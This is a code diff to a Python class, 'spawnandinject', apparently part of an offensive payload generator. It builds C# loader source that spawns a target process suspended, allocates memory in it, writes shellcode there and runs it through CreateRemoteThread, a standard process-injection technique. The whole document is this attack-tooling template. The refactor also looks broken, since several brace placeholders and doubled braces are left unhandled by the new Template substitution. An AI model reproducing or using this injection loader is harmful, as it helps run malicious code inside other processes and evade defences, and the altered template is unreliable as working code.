@@ -1,3 +1,5 @@
+from string import Template
+
 class spawnandinject:
     def __init__(self, arguments):
         self.memoryPermission = '0x20'
@@ -20,8 +22,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 {imports}
 
 [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
@@ -130,14 +132,14 @@ namespace ClassLibrary1
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
-            CreateProcess(null, "{self.target}", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+            CreateProcess(null, "$target", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
 
             {transformers}
 
             IntPtr bytesWritten;
             IntPtr threadId;
 
-            IntPtr pRemoteCode = VirtualAllocEx(pi.hProcess, IntPtr.Zero, {shellcodeSize}, 0x3000, {self.memoryPermission});
+            IntPtr pRemoteCode = VirtualAllocEx(pi.hProcess, IntPtr.Zero, {shellcodeSize}, 0x3000, $memoryPermission);
             WriteProcessMemory(pi.hProcess, pRemoteCode, shellcode, {shellcodeSize}, out bytesWritten);
             IntPtr hThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, pRemoteCode, IntPtr.Zero, 0, out threadId);
             WaitForSingleObject(hThread, 500);
@@ -146,4 +148,4 @@ namespace ClassLibrary1
         }}
     }}
 }}
-"""
+""").substitute(target=self.target, memoryPermission=self.memoryPermission)
